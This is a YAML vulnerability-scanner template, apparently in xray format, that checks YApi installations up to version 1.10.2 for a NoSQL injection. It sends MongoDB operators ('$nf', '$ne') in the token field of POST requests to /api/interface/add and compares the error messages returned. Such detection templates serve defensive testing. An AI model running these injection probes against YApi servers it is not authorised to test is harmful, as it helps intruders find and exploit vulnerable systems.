name: poc-yaml-yapi-sql-injection
binding: ac9647f2-a4c8-4302-ae61-524c799cbbf4
manual: true
detail:
    author: yywing
    links:
        - https://github.com/YMFE/yapi/pull/2628/commits/432cdfeb29667eea8b82d72a265022ac9515bdb7
        - https://xz.aliyun.com/t/9908
    affect_version: ≤1.10.2
    vulnerability:
        id: CT-515192
        level: high
transport: http
set:
    s1: randomInt(1000, 9000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/interface/add
            headers:
                Content-Type: application/json
            body: |
                {"token": {"$nf": "{{s1}}"}}
        expression: response.status == 200 && response.body_string.contains("服务器出错")
    r1:
        request:
            cache: true
            method: POST
            path: /api/interface/add
            headers:
                Content-Type: application/json
            body: |
                {"token": {"$ne": "{{s1}}"}}
        expression: response.status == 200 && !response.body_string.contains("服务器出错")
expression: r0() && r1()
